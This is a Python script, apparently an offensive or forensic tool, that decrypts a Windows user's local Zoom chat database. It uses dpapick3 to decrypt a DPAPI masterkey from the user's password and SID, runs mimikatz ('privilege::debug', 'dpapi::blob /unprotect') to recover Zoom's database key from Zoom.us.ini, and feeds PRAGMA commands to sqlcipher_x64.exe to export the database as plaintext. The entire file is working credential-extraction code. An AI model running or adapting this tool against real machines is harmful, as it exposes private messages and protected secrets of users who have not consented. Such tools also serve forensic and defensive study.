import base64, sys, configparser, os, subprocess, hashlib
try:
    import dpapick3.masterkey as masterkey
except ImportError:
    raise ImportError('[-] Missing dpapick3, please install via pip install dpapick3.')

def decypher_masterkey(sid, password, masterkey_file):
    with open(masterkey_file, 'rb') as f:
        mk = masterkey.MasterKeyFile(f.read())
        mk.decryptWithPassword(sid, password)

        if mk.decrypted:
            mkey = mk.get_key()
            mk_decrypted = {
                "status": "OK",
                "mk_key": mkey.hex(),
                "mk_sha1": hashlib.sha1(mkey).digest().hex()
            }
            return mk_decrypted
        else:
            mk_failed = {
                "status": "KO",
                "mk_guid": mk.guid,
                "message": "Failed to decrypt masterkey! Exiting..."
            }
            return mk_failed

def get_database_key(zoom_config_file, mimikatz_file, masterkey):
    
    config = configparser.ConfigParser()

    try:
        config.read(zoom_config_file)
    except configparser.MissingSectionHeaderError:
        print("File is not a config file or is incorrectly built.")
        exit(1)

    encoded_dpapi_encrypted_key = config.get("ZoomChat", "win_osencrypt_key").replace("ZWOSKEY", "")

    dpapi_encrypted_key = base64.b64decode(encoded_dpapi_encrypted_key)
        

    file_obj = open("dpapi_encrypted_key", "wb")
    file_obj.write(dpapi_encrypted_key)
    file_obj.close()

    dpapi_encrypted_key_file = os.path.abspath(file_obj.name)

    database_key_file = "database_key"

    mimikatz_args = [mimikatz_file, "privilege::debug", "log log_mimikatz.txt", "dpapi::blob /in:\"{0}\" /masterkey:{1} /unprotect /out:\"{2}\"".format(dpapi_encrypted_key_file, masterkey, database_key_file), "exit"]

    p = subprocess.Popen(args=mimikatz_args, stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=False)
    p.wait()
    
    if p.returncode == 0:
        os.remove(dpapi_encrypted_key_file)
        
        file_obj = open(database_key_file, "r")
        database_key = file_obj.read()
        file_obj.close()
        
        os.remove(os.path.abspath(file_obj.name))
        return database_key

if __name__ == "__main__":
    if len(sys.argv) != 8:
        print("7 arguments are required.\n1 - Zoom config file (Zoom.us.ini)\n2 - mimikatz.exe file path\n3 - User windows password\n4 - User's masterkey SID\n5 - User's masterkey\n6 - File path for encrypted database to decrypt\n7 - Directory for decrypted database")
        exit(1)

    masterkey_json = decypher_masterkey(sys.argv[4], sys.argv[3], sys.argv[5])
    if masterkey_json["status"] == "OK":
        database_key = get_database_key(sys.argv[1], sys.argv[2], masterkey_json["mk_key"])
        sqlcipher_args = ["sqlcipher_x64.exe", sys.argv[6]]
        print(sqlcipher_args)

        communication = "PRAGMA key ='{0}';\nPRAGMA kdf_iter = '4000';\nPRAGMA cipher_page_size = 1024;\nATTACH DATABASE 'zoomus.db' AS zoom KEY '';\nSELECT sqlcipher_export('zoom');\nDETACH DATABASE zoom;\n.exit\n".format(database_key)
        communication_bytes = str.encode(communication)

        p = subprocess.Popen(sqlcipher_args, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=False)
        p.stdin.write(communication_bytes)
        output = p.communicate()[0]
        print(output)


